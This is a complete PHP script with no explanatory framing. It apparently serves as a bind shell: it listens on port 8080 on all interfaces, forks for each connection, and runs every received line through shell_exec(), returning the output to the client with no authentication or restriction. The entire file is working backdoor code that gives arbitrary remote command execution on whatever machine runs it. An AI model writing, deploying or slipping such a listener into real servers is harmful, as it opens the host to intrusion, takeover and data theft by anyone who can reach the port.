<?php

$port = 8080;

// Create a TCP socket
$socket = socket_create(AF_INET, SOCK_STREAM, 0);
if (!$socket) {
    die("socket_create() failed: " . socket_strerror(socket_last_error()));
}

// Bind the socket to the specified port
$result = socket_bind($socket, '0.0.0.0', $port);
if (!$result) {
    die("socket_bind() failed: " . socket_strerror(socket_last_error()));
}

// Listen for incoming connections
socket_listen($socket);

echo "Server started on port $port\n";

while (true) {
    // Accept a client connection
    $clientSocket = socket_accept($socket);
    if (!$clientSocket) {
        die("socket_accept() failed: " . socket_strerror(socket_last_error()));
    }

    // Handle the client in a separate process (using fork)
    $pid = pcntl_fork();
    if ($pid === -1) {
        die("pcntl_fork() failed: " . pcntl_strerror(pcntl_get_last_error()));
    } elseif ($pid === 0) {
        // Child process: handle the client
        socket_close($socket); // Close the listening socket in the child

        while ($data = socket_read($clientSocket, 1024)) {
            $command = trim($data);
            echo "Received command: $command\n";

            // Execute the command using shell_exec()
            $output = shell_exec($command);

            // Send the output back to the client
            socket_write($clientSocket, $output);
        }

        socket_close($clientSocket);
        exit(0);
    } else {
        // Parent process: close the client socket
        socket_close($clientSocket);
    }
}

socket_close($socket);

?>
